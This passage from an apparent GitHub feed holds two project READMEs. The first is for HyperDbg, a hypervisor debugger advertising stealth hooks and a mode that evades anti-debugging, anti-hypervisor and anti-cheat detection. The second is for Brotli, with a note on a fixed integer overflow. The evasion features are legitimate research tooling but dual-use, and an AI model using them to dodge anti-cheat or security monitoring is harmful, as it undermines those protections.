href=&#34;https://twitter.com/HyperDbg&#34;&gt;Twitter&lt;/a&gt;&lt;/strong&gt; to get notified about new releases.&lt;/p&gt; &#xA;&lt;h2&gt;Description&lt;/h2&gt; &#xA;&lt;p&gt;HyperDbg is designed with a focus on using modern hardware technologies to provide new features to the debuggers&#39; world. It operates on top of Windows by virtualizing an already running system using Intel VT-x and Intel PT. This debugger aims not to use any APIs and software debugging mechanisms, but instead, it uses Second Layer Page Table (a.k.a. Extended Page Table or EPT) extensively to monitor both kernel and user executions.&lt;/p&gt; &#xA;&lt;p align=&#34;center&#34;&gt;&lt;a href=&#34;https://hyperdbg.org/&#34;&gt;&lt;img align=&#34;center&#34; width=&#34;600&#34; height=&#34;500&#34; src=&#34;https://raw.githubusercontent.com/HyperDbg/graphics/master/Art%20Board/Artboard%201.png&#34; alt=&#34;HyperDbg Debugger&#34;&gt;&lt;/a&gt;&lt;br&gt; &lt;/p&gt; HyperDbg comes with features like hidden hooks, which is as fast as old inline hooks, but also stealth. It mimics hardware debug registers for (read &amp;amp; write) to a specific location, but this time entirely invisible for both Windows kernel and the programs, and of course without any limitation in size or count! &#xA;&lt;p&gt;Using TLB-splitting, and having features such as measuring code coverage and monitoring all mov(s) to/from memory by a function, makes HyperDbg a unique debugger.&lt;/p&gt; &#xA;&lt;p&gt;Although it has novel features, HyperDbg tries to be as stealth as possible. It doesn’t use any debugging APIs to debug Windows or any application, so classic anti-debugging methods won’t detect it. Also, it resists the exploitation of time delta methods (e.g., RDTSC/RDTSCP) to detect the presence of hypervisors, therefore making it much harder for applications, packers, protectors, malware, anti-cheat engines, etc. to discover the debugger.&lt;/p&gt; &#xA;&lt;h2&gt;Build &amp;amp; Installation&lt;/h2&gt; &#xA;&lt;p&gt;You can download latest compiled binary files from &lt;strong&gt;&lt;a href=&#34;https://github.com/HyperDbg/HyperDbg/releases&#34;&gt;releases&lt;/a&gt;&lt;/strong&gt;; otherwise, if you want to build HyperDbg, you should clone HyperDbg with the &lt;code&gt;--recursive&lt;/code&gt; flag.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;git clone --recursive https://github.com/HyperDbg/HyperDbg.git&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Please visit &lt;strong&gt;&lt;a href=&#34;https://docs.hyperdbg.org/getting-started/build-and-install&#34;&gt;Build &amp;amp; Install&lt;/a&gt;&lt;/strong&gt; and &lt;strong&gt;&lt;a href=&#34;https://docs.hyperdbg.org/getting-started/quick-start&#34;&gt;Quick Start&lt;/a&gt;&lt;/strong&gt; for a detailed explanation of how to start with &lt;strong&gt;HyperDbg&lt;/strong&gt;. You can also see &lt;strong&gt;&lt;a href=&#34;https://docs.hyperdbg.org/getting-started/faq&#34;&gt;FAQ&lt;/a&gt;&lt;/strong&gt; for more information.&lt;/p&gt; &#xA;&lt;h2&gt;Publications&lt;/h2&gt; &#xA;&lt;p&gt;In case you use one of &lt;strong&gt;HyperDbg&lt;/strong&gt;&#39;s components in your work, please consider citing our paper.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;1. &lt;a href=&#34;https://www.preprints.org/manuscript/202205.0416/v1/download&#34;&gt;HyperDbg: Reinventing Hardware-Assisted Debugging&lt;/a&gt;&lt;/strong&gt; (&lt;a href=&#34;https://www.preprints.org/manuscript/202205.0416/v1&#34;&gt;preprints.org&lt;/a&gt;)&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;@article{karvandi2022hyperdbg,&#xA;  title={HyperDbg: Reinventing Hardware-Assisted Debugging},&#xA;  author = {Karvandi, Mohammad Sina and Gholamrezaei, MohammadHosein and Khalaj Monfared , Saleh and Medi , Soroush and Abbassi, Behrooz and Amini, Ali and Mortazavi , Reza and Gorgin , Saeid and Rahmati , Dara and Schwarz, Michael},&#xA;  year={2022},&#xA;  doi = {10.20944/preprints202205.0416.v1},&#xA;  publisher={Preprints}&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Unique Features&lt;/h2&gt; &#xA;&lt;h3&gt;First Release (v0.1.0.0)&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Advanced Hypervisor-based Kernel Mode Debugger [&lt;a href=&#34;https://docs.hyperdbg.org/using-hyperdbg/kernel-mode-debugging&#34; target=&#34;_blank&#34;&gt;link&lt;/a&gt;][&lt;a href=&#34;https://docs.hyperdbg.org/getting-started/attach-to-hyperdbg/debug&#34; target=&#34;_blank&#34;&gt;link&lt;/a&gt;][&lt;a href=&#34;https://docs.hyperdbg.org/getting-started/attach-to-hyperdbg/local-debugging&#34; target=&#34;_blank&#34;&gt;link&lt;/a&gt;]&lt;/li&gt; &#xA; &lt;li&gt;Classic EPT Hook (Hidden Breakpoint) [&lt;a href=&#34;https://docs.hyperdbg.org/commands/extension-commands/epthook&#34; target=&#34;_blank&#34;&gt;link&lt;/a&gt;][&lt;a href=&#34;https://docs.hyperdbg.org/design/features/vmm-module/design-of-epthook&#34; target=&#34;_blank&#34;&gt;link&lt;/a&gt;][&lt;a href=&#34;https://docs.hyperdbg.org/using-hyperdbg/kernel-mode-debugging/examples/events/hooking-any-function&#34; target=&#34;_blank&#34;&gt;link&lt;/a&gt;]&lt;/li&gt; &#xA; &lt;li&gt;Inline EPT Hook (Inline Hook) [&lt;a href=&#34;https://docs.hyperdbg.org/commands/extension-commands/epthook2&#34; target=&#34;_blank&#34;&gt;link&lt;/a&gt;][&lt;a href=&#34;https://docs.hyperdbg.org/design/features/vmm-module/design-of-epthook2&#34; target=&#34;_blank&#34;&gt;link&lt;/a&gt;]&lt;/li&gt; &#xA; &lt;li&gt;Monitor Memory For R/W (Emulating Hardware Debug Registers Without Limitation) [&lt;a href=&#34;https://docs.hyperdbg.org/commands/extension-commands/monitor&#34; target=&#34;_blank&#34;&gt;link&lt;/a&gt;][&lt;a href=&#34;https://docs.hyperdbg.org/design/features/vmm-module/design-of-monitor&#34; target=&#34;_blank&#34;&gt;link&lt;/a&gt;][&lt;a href=&#34;https://docs.hyperdbg.org/using-hyperdbg/kernel-mode-debugging/examples/events/monitoring-accesses-to-structures&#34; target=&#34;_blank&#34;&gt;link&lt;/a&gt;]&lt;/li&gt; &#xA; &lt;li&gt;SYSCALL Hook (Disable EFER &amp;amp; Handle #UD) [&lt;a href=&#34;https://docs.hyperdbg.org/commands/extension-commands/syscall&#34; target=&#34;_blank&#34;&gt;link&lt;/a&gt;][&lt;a href=&#34;https://docs.hyperdbg.org/design/features/vmm-module/design-of-syscall-and-sysret&#34; target=&#34;_blank&#34;&gt;link&lt;/a&gt;][&lt;a href=&#34;https://docs.hyperdbg.org/using-hyperdbg/kernel-mode-debugging/examples/events/intercepting-all-syscalls&#34; target=&#34;_blank&#34;&gt;link&lt;/a&gt;]&lt;/li&gt; &#xA; &lt;li&gt;SYSRET Hook (Disable EFER &amp;amp; Handle #UD) [&lt;a href=&#34;https://docs.hyperdbg.org/commands/extension-commands/sysret&#34; target=&#34;_blank&#34;&gt;link&lt;/a&gt;][&lt;a href=&#34;https://docs.hyperdbg.org/design/features/vmm-module/design-of-syscall-and-sysret&#34; target=&#34;_blank&#34;&gt;link&lt;/a&gt;]&lt;/li&gt; &#xA; &lt;li&gt;CPUID Hook &amp;amp; Monitor [&lt;a href=&#34;https://docs.hyperdbg.org/commands/extension-commands/cpuid&#34; target=&#34;_blank&#34;&gt;link&lt;/a&gt;][&lt;a href=&#34;https://docs.hyperdbg.org/using-hyperdbg/kernel-mode-debugging/examples/events/triggering-special-instructions&#34; target=&#34;_blank&#34;&gt;link&lt;/a&gt;]&lt;/li&gt; &#xA; &lt;li&gt;RDMSR Hook &amp;amp; Monitor [&lt;a href=&#34;https://docs.hyperdbg.org/commands/extension-commands/msrread&#34; target=&#34;_blank&#34;&gt;link&lt;/a&gt;][&lt;a href=&#34;https://docs.hyperdbg.org/using-hyperdbg/kernel-mode-debugging/examples/events/identifying-system-behavior&#34; target=&#34;_blank&#34;&gt;link&lt;/a&gt;]&lt;/li&gt; &#xA; &lt;li&gt;WRMSR Hook &amp;amp; Monitor [&lt;a href=&#34;https://docs.hyperdbg.org/commands/extension-commands/msrwrite&#34; target=&#34;_blank&#34;&gt;link&lt;/a&gt;][&lt;a href=&#34;https://docs.hyperdbg.org/using-hyperdbg/kernel-mode-debugging/examples/events/identifying-system-behavior&#34; target=&#34;_blank&#34;&gt;link&lt;/a&gt;]&lt;/li&gt; &#xA; &lt;li&gt;RDTSC/RDTSCP Hook &amp;amp; Monitor [&lt;a href=&#34;https://docs.hyperdbg.org/commands/extension-commands/tsc&#34; target=&#34;_blank&#34;&gt;link&lt;/a&gt;]&lt;/li&gt; &#xA; &lt;li&gt;RDPMC Hook &amp;amp; Monitor [&lt;a href=&#34;https://docs.hyperdbg.org/commands/extension-commands/pmc&#34; target=&#34;_blank&#34;&gt;link&lt;/a&gt;]&lt;/li&gt; &#xA; &lt;li&gt;VMCALL Hook &amp;amp; Monitor [&lt;a href=&#34;https://docs.hyperdbg.org/commands/extension-commands/vmcall&#34; target=&#34;_blank&#34;&gt;link&lt;/a&gt;]&lt;/li&gt; &#xA; &lt;li&gt;Debug Registers Hook &amp;amp; Monitor [&lt;a href=&#34;https://docs.hyperdbg.org/commands/extension-commands/dr&#34; target=&#34;_blank&#34;&gt;link&lt;/a&gt;]&lt;/li&gt; &#xA; &lt;li&gt;I/O Port (In Instruction) Hook &amp;amp; Monitor [&lt;a href=&#34;https://docs.hyperdbg.org/commands/extension-commands/ioin&#34; target=&#34;_blank&#34;&gt;link&lt;/a&gt;][&lt;a href=&#34;https://docs.hyperdbg.org/using-hyperdbg/kernel-mode-debugging/examples/events/triggering-special-instructions&#34; target=&#34;_blank&#34;&gt;link&lt;/a&gt;]&lt;/li&gt; &#xA; &lt;li&gt;I/O Port (Out Instruction) Hook &amp;amp; Monitor [&lt;a href=&#34;https://docs.hyperdbg.org/commands/extension-commands/ioout&#34; target=&#34;_blank&#34;&gt;link&lt;/a&gt;][&lt;a href=&#34;https://docs.hyperdbg.org/using-hyperdbg/kernel-mode-debugging/examples/events/triggering-special-instructions&#34; target=&#34;_blank&#34;&gt;link&lt;/a&gt;]&lt;/li&gt; &#xA; &lt;li&gt;MMIO Monitor [&lt;a href=&#34;https://docs.hyperdbg.org/commands/extension-commands/monitor&#34; target=&#34;_blank&#34;&gt;link&lt;/a&gt;]&lt;/li&gt; &#xA; &lt;li&gt;Exception (IDT &amp;lt; 32) Monitor [&lt;a href=&#34;https://docs.hyperdbg.org/commands/extension-commands/exception&#34; target=&#34;_blank&#34;&gt;link&lt;/a&gt;][&lt;a href=&#34;https://docs.hyperdbg.org/design/features/vmm-module/design-of-exception-and-interrupt&#34; target=&#34;_blank&#34;&gt;link&lt;/a&gt;][&lt;a href=&#34;https://docs.hyperdbg.org/using-hyperdbg/kernel-mode-debugging/examples/events/identifying-system-behavior&#34; target=&#34;_blank&#34;&gt;link&lt;/a&gt;]&lt;/li&gt; &#xA; &lt;li&gt;External-Interrupt (IDT &amp;gt; 32) Monitor [&lt;a href=&#34;https://docs.hyperdbg.org/commands/extension-commands/interrupt&#34; target=&#34;_blank&#34;&gt;link&lt;/a&gt;][&lt;a href=&#34;https://docs.hyperdbg.org/design/features/vmm-module/design-of-exception-and-interrupt&#34; target=&#34;_blank&#34;&gt;link&lt;/a&gt;][&lt;a href=&#34;https://docs.hyperdbg.org/using-hyperdbg/kernel-mode-debugging/examples/events/identifying-system-behavior&#34; target=&#34;_blank&#34;&gt;link&lt;/a&gt;]&lt;/li&gt; &#xA; &lt;li&gt;Running Automated Scripts [&lt;a href=&#34;https://docs.hyperdbg.org/commands/scripting-language/debugger-script&#34; target=&#34;_blank&#34;&gt;link&lt;/a&gt;]&lt;/li&gt; &#xA; &lt;li&gt;Transparent-mode (Anti-debugging and Anti-hypervisor Resistance) [&lt;a href=&#34;https://docs.hyperdbg.org/tips-and-tricks/considerations/transparent-mode&#34; target=&#34;_blank&#34;&gt;link&lt;/a&gt;][&lt;a href=&#34;https://docs.hyperdbg.org/using-hyperdbg/kernel-mode-debugging/examples/misc/defeating-anti-debug-and-anti-hypervisor-methods&#34; target=&#34;_blank&#34;&gt;link&lt;/a&gt;]&lt;/li&gt; &#xA; &lt;li&gt;Running Custom Assembly In Both VMX-root, VMX non-root (Kernel &amp;amp; User) [&lt;a href=&#34;https://docs.hyperdbg.org/using-hyperdbg/prerequisites/how-to-create-an-action&#34; target=&#34;_blank&#34;&gt;link&lt;/a&gt;]&lt;/li&gt; &#xA; &lt;li&gt;Checking For Custom Conditions [&lt;a href=&#34;https://docs.hyperdbg.org/using-hyperdbg/prerequisites/how-to-create-a-condition&#34; target=&#34;_blank&#34;&gt;link&lt;/a&gt;][&lt;a href=&#34;https://docs.hyperdbg.org/design/debugger-internals/conditions&#34; target=&#34;_blank&#34;&gt;link&lt;/a&gt;]&lt;/li&gt; &#xA; &lt;li&gt;Process-specific &amp;amp; Thread-specific Debugging [&lt;a href=&#34;https://docs.hyperdbg.org/commands/meta-commands/.process&#34; target=&#34;_blank&#34;&gt;link&lt;/a&gt;][&lt;a href=&#34;https://docs.hyperdbg.org/commands/meta-commands/.thread&#34; target=&#34;_blank&#34;&gt;link&lt;/a&gt;][&lt;a href=&#34;https://docs.hyperdbg.org/using-hyperdbg/user-mode-debugging/examples/basics/switching-to-a-specific-process-or-thread&#34; target=&#34;_blank&#34;&gt;link&lt;/a&gt;]&lt;/li&gt; &#xA; &lt;li&gt;VMX-root Compatible Message Tracing [&lt;a href=&#34;https://docs.hyperdbg.org/design/features/vmm-module/vmx-root-mode-compatible-message-tracing&#34; target=&#34;_blank&#34;&gt;link&lt;/a&gt;]&lt;/li&gt; &#xA; &lt;li&gt;Powerful Kernel Side Scripting Engine [&lt;a href=&#34;https://docs.hyperdbg.org/commands/scripting-language&#34; target=&#34;_blank&#34;&gt;link&lt;/a&gt;][&lt;a href=&#34;https://docs.hyperdbg.org/design/script-engine&#34; target=&#34;_blank&#34;&gt;link&lt;/a&gt;]&lt;/li&gt; &#xA; &lt;li&gt;Support To Symbols (Parsing PDB Files) [&lt;a href=&#34;https://docs.hyperdbg.org/commands/meta-commands/.sympath&#34; target=&#34;_blank&#34;&gt;link&lt;/a&gt;][&lt;a href=&#34;https://docs.hyperdbg.org/commands/meta-commands/.sym&#34; target=&#34;_blank&#34;&gt;link&lt;/a&gt;]&lt;/li&gt; &#xA; &lt;li&gt;Mapping Data To Symbols &amp;amp; Create Structures, Enums From PDB Files [&lt;a href=&#34;https://docs.hyperdbg.org/commands/debugging-commands/dt&#34; target=&#34;_blank&#34;&gt;link&lt;/a&gt;][&lt;a href=&#34;https://docs.hyperdbg.org/commands/debugging-commands/struct&#34; target=&#34;_blank&#34;&gt;link&lt;/a&gt;][&lt;a href=&#34;https://docs.hyperdbg.org/using-hyperdbg/kernel-mode-debugging/examples/basics/mapping-data-and-create-structures-and-enums-from-symbols&#34; target=&#34;_blank&#34;&gt;link&lt;/a&gt;]&lt;/li&gt; &#xA; &lt;li&gt;Event Forwarding (#DFIR) [&lt;a href=&#34;https://docs.hyperdbg.org/tips-and-tricks/misc/event-forwarding&#34; target=&#34;_blank&#34;&gt;link&lt;/a&gt;][&lt;a href=&#34;https://docs.hyperdbg.org/commands/debugging-commands/output&#34; target=&#34;_blank&#34;&gt;link&lt;/a&gt;]&lt;/li&gt; &#xA; &lt;li&gt;Transparent Breakpoint Handler [&lt;a href=&#34;https://docs.hyperdbg.org/commands/debugging-commands/bp&#34; target=&#34;_blank&#34;&gt;link&lt;/a&gt;][&lt;a href=&#34;https://docs.hyperdbg.org/using-hyperdbg/kernel-mode-debugging/examples/basics/setting-breakpoints-and-stepping-instructions&#34; target=&#34;_blank&#34;&gt;link&lt;/a&gt;]&lt;/li&gt; &#xA; &lt;li&gt;Various Custom Scripts [&lt;a href=&#34;https://github.com/HyperDbg/scripts&#34; target=&#34;_blank&#34;&gt;link&lt;/a&gt;]&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Second Release (v0.2.0.0)&lt;/h3&gt; &#xA;&lt;p&gt;(not released yet !)&lt;/p&gt; &#xA;&lt;h2&gt;How does it work?&lt;/h2&gt; &#xA;&lt;p&gt;You can read about internal design of HyperDbg and its features in the &lt;a href=&#34;https://docs.hyperdbg.org/design&#34;&gt;documentation&lt;/a&gt;. Here&#39;s a top-level diagram that shows how HyperDbg works: &lt;br&gt;&lt;/p&gt; &#xA;&lt;p align=&#34;center&#34;&gt;&lt;a href=&#34;https://hyperdbg.org/&#34;&gt;&lt;img align=&#34;center&#34; width=&#34;70%&#34; height=&#34;100%&#34; src=&#34;https://raw.githubusercontent.com/HyperDbg/graphics/master/Diagrams/Diagram-hq-v1/Diagram_v1.jpg&#34; alt=&#34;HyperDbg Design&#34;&gt;&lt;/a&gt;&lt;br&gt; &lt;/p&gt; &#xA;&lt;br&gt; &#xA;&lt;h2&gt;Scripts&lt;/h2&gt; &#xA;&lt;p&gt;You can write your &lt;strong&gt;&lt;a href=&#34;https://github.com/HyperDbg/scripts&#34;&gt;scripts&lt;/a&gt;&lt;/strong&gt; to automate your debugging journey. &lt;strong&gt;HyperDbg&lt;/strong&gt; has a powerful, fast, and entirely kernel-side implemented &lt;a href=&#34;https://docs.hyperdbg.org/commands/scripting-language&#34;&gt;script engine&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;Credits&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;All of the &lt;a href=&#34;https://github.com/HyperDbg/HyperDbg/graphs/contributors&#34;&gt;contributors&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Mohammad Sina Karvandi (&lt;a href=&#34;https://twitter.com/Intel80x86&#34;&gt;@Intel80x86&lt;/a&gt;)&lt;/li&gt; &#xA; &lt;li&gt;MH Gholamrezaei (&lt;a href=&#34;https://twitter.com/mohoseinam&#34;&gt;@mohoseinam&lt;/a&gt;)&lt;/li&gt; &#xA; &lt;li&gt;Website by Mohammad Ataei (&lt;a href=&#34;https://twitter.com/mammadataei&#34;&gt;@mammadataei&lt;/a&gt;)&lt;/li&gt; &#xA; &lt;li&gt;Saleh Khalaj Monfared (&lt;a href=&#34;https://twitter.com/S4l3hh&#34;&gt;@S4l3hh&lt;/a&gt;)&lt;/li&gt; &#xA; &lt;li&gt;Alee Amini (&lt;a href=&#34;https://twitter.com/AleeAmini&#34;&gt;@AleeAmini&lt;/a&gt;)&lt;/li&gt; &#xA; &lt;li&gt;Behrooz Abbassi (&lt;a href=&#34;https://twitter.com/BehroozAbbassi&#34;&gt;@BehroozAbbassi&lt;/a&gt;)&lt;/li&gt; &#xA; &lt;li&gt;Zyantific Team for &lt;a href=&#34;https://zydis.re&#34;&gt;Zydis&lt;/a&gt; Disassembler&lt;/li&gt; &#xA; &lt;li&gt;Petr Benes (&lt;a href=&#34;https://twitter.com/PetrBenes&#34;&gt;@PetrBenes&lt;/a&gt;) for &lt;a href=&#34;https://github.com/ia32-doc/ia32-doc&#34;&gt;ia32-doc&lt;/a&gt;, &lt;a href=&#34;https://github.com/wbenny/pdbex&#34;&gt;pdbex&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Process Hacker Team for &lt;a href=&#34;https://github.com/processhacker/phnt&#34;&gt;phnt&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Contributing&lt;/h2&gt; &#xA;&lt;p&gt;Contributing in HyperDbg is super appreciated. We have made a list of potential &lt;a href=&#34;https://github.com/HyperDbg/HyperDbg/raw/master/CONTRIBUTING.md#things-to-work-on&#34;&gt;tasks&lt;/a&gt; that you might be intersted in contributing towards.&lt;/p&gt; &#xA;&lt;p&gt;If you want to contribute in HyperDbg please read &lt;a href=&#34;https://github.com/HyperDbg/HyperDbg/raw/master/CONTRIBUTING.md&#34;&gt;Contribution Guide&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;License&lt;/h2&gt; &#xA;&lt;p&gt;&lt;strong&gt;HyperDbg&lt;/strong&gt;, and all its submodules and repos, unless a license is otherwise specified, are licensed under &lt;strong&gt;GPLv3&lt;/strong&gt; LICENSE.&lt;/p&gt; &#xA;&lt;p&gt;Dependencies are licensed by their own.&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>google/brotli</title>
    <updated>2022-06-03T01:34:42Z</updated>
    <id>tag:github.com,2022-06-03:/google/brotli</id>
    <link href="https://github.com/google/brotli" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Brotli compression format&lt;/p&gt;&lt;hr&gt;&lt;p align=&#34;center&#34;&gt;&lt;img src=&#34;https://brotli.org/brotli.svg?sanitize=true&#34; alt=&#34;Brotli&#34; width=&#34;64&#34;&gt;&lt;/p&gt; &#xA;&lt;h1&gt;SECURITY NOTE&lt;/h1&gt; &#xA;&lt;p&gt;Please consider updating brotli to version 1.0.9 (latest).&lt;/p&gt; &#xA;&lt;p&gt;Version 1.0.9 contains a fix to &#34;integer overflow&#34; problem. This happens when &#34;one-shot&#34; decoding API is used (or input chunk for streaming API is not limited), input size (chunk size) is larger than 2GiB, and input contains uncompressed blocks. After the overflow happens, &lt;code&gt;memcpy&lt;/code&gt; is invoked with a gigantic &lt;code&gt;num&lt;/code&gt; value, that will likely cause the crash.&lt;/p&gt; &#xA;&lt;h3&gt;Introduction&lt;/h3&gt; &#xA;&lt;p&gt;Brotli is a generic-purpose lossless compression algorithm that compresses data using a combination of a modern variant of the LZ77 algorithm, Huffman coding and 2nd order context modeling, with a compression ratio comparable to the best currently available general-purpose compression methods. It is similar in speed with deflate but offers more dense compression.&lt;/p&gt; &#xA;&lt;p&gt;The specification of the Brotli Compressed Data Format is defined in &lt;a href=&#34;https://tools.ietf.org/html/rfc7932&#34;&gt;RFC 7932&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;Brotli is open-sourced under the MIT License, see the LICENSE file.&lt;/p&gt; &#xA;&lt;p&gt;Brotli mailing list: &lt;a href=&#34;https://groups.google.com/forum/#!forum/brotli&#34;&gt;https://groups.google.com/forum/#!forum/brotli&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://github.com/google/brotli/actions/workflows/build_test.yml/badge.svg?sanitize=true&#34; alt=&#34;GitHub Actions Build Status&#34;&gt; &lt;a href=&#34;https://oss-fuzz-build-logs.storage.googleapis.com/index.html#brotli&#34;&gt;&lt;img src=&#34;https://oss-fuzz-build-logs.storage.googleapis.com/badges/brotli.svg?sanitize=true&#34; alt=&#34;Fuzzing Status&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h3&gt;Build instructions&lt;/h3&gt; &#xA;&lt;h4&gt;Vcpkg&lt;/h4&gt; &#xA;&lt;p&gt;You can download and install brotli using the &lt;a href=&#34;https://github.com/Microsoft/vcpkg/&#34;&gt;vcpkg&lt;/a&gt; dependency manager:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;git clone https://github.com/Microsoft/vcpkg.git&#xA;cd vcpkg&#xA;./bootstrap-vcpkg.sh&#xA;./vcpkg integrate install&#xA;./vcpkg install brotli&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;The brotli port in vcpkg is kept up to date by Microsoft team members and community contributors. If the version is out of date, please &lt;a href=&#34;https://github.com/Microsoft/vcpkg&#34;&gt;create an issue or pull request&lt;/a&gt; on the vcpkg repository.&lt;/p&gt; &#xA;&lt;h4&gt;Autotools-style CMake&lt;/h4&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/nemequ/configure-cmake&#34;&gt;configure-cmake&lt;/a&gt; is an autotools-style configure script for CMake-based projects (not supported on Windows).&lt;/p&gt; &#xA;&lt;p&gt;The basic commands to build, test and install brotli are:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;$ mkdir out &amp;amp;&amp;amp; cd out&#xA;$ ../configure-cmake&#xA;$ make&#xA;$ make test&#xA;$ make install&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;By default, debug binaries are built. To generate &#34;release&#34; &lt;code&gt;Makefile&lt;/code&gt; specify &lt;code&gt;--disable-debug&lt;/code&gt; option to &lt;code&gt;configure-cmake&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;h4&gt;Bazel&lt;/h4&gt; &#xA;&lt;p&gt;See &lt;a href=&#34;http://www.bazel.build/&#34;&gt;Bazel&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h4&gt;CMake&lt;/h4&gt; &#xA;&lt;p&gt;The basic commands to build and install brotli are:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;$ mkdir out &amp;amp;&amp;amp; cd out&#xA;$ cmake -DCMAKE_BUILD_TYPE=Release -DCMAKE_INSTALL_PREFIX=./installed ..&#xA;$ cmake --build . --config Release --target install&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;You can use other &lt;a href=&#34;https://cmake.org/&#34;&gt;CMake&lt;/a&gt; configuration.&lt;/p&gt; &#xA;&lt;h4&gt;Premake5&lt;/h4&gt; &#xA;&lt;p&gt;See &lt;a href=&#34;https://premake.github.io/&#34;&gt;Premake5&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h4&gt;Python&lt;/h4&gt; &#xA;&lt;p&gt;To install the latest release of the Python module, run the following:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;$ pip install brotli&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;To install the tip-of-the-tree version, run:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;$ pip install --upgrade git+https://github.com/google/brotli&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;See the &lt;a href=&#34;https://raw.githubusercontent.com/google/brotli/master/python/README.md&#34;&gt;Python readme&lt;/a&gt; for more details on installing from source, development, and testing.&lt;/p&gt; &#xA;&lt;h3&gt;Benchmarks&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://quixdb.github.io/squash-benchmark/&#34;&gt;Squash Compression Benchmark&lt;/a&gt; / &lt;a href=&#34;https://quixdb.github.io/squash-benchmark/unstable/&#34;&gt;Unstable Squash Compression Benchmark&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;http://mattmahoney.net/dc/text.html&#34;&gt;Large Text Compression Benchmark&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://sites.google.com/site/powturbo/home/benchmark&#34;&gt;Lzturbo Benchmark&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Related projects&lt;/h3&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;&lt;strong&gt;Disclaimer:&lt;/strong&gt; Brotli authors take no responsibility for the third party projects mentioned in this section.&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;p&gt;Independent &lt;a href=&#34;https://github.com/madler/brotli&#34;&gt;decoder&lt;/a&gt; implementation by Mark Adler, based entirely on format specification.&lt;/p&gt; &#xA;&lt;p&gt;JavaScript port of brotli &lt;a href=&#34;https://github.com/devongovett/brotli.js&#34;&gt;decoder&lt;/a&gt;. Could be used directly via &lt;code&gt;npm install brotli&lt;/code&gt;&lt;/p&gt; &#xA;&lt;p&gt;Hand ported &lt;a href=&#34;https://github.com/dominikhlbg/BrotliHaxe&#34;&gt;decoder / encoder&lt;/a&gt; in haxe by Dominik Homberger. Output source code: JavaScript, PHP, Python, Java and C#&lt;/p&gt; &#xA;&lt;p&gt;7Zip &lt;a href=&#34;https://github.com/mcmilk/7-Zip-Zstd&#34;&gt;plugin&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;Dart &lt;a href=&#34;https://github.com/thosakwe/brotli&#34;&gt;native bindings&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;Dart compression framework with &lt;a href=&#34;https://pub.dev/documentation/es_compression/latest/brotli/brotli-library.html&#34;&gt;fast FFI-based Brotli implementation&lt;/a&gt; with ready-to-use prebuilt binaries for Win/Linux/Mac&lt;/p&gt;</summary>
  </entry>
</feed>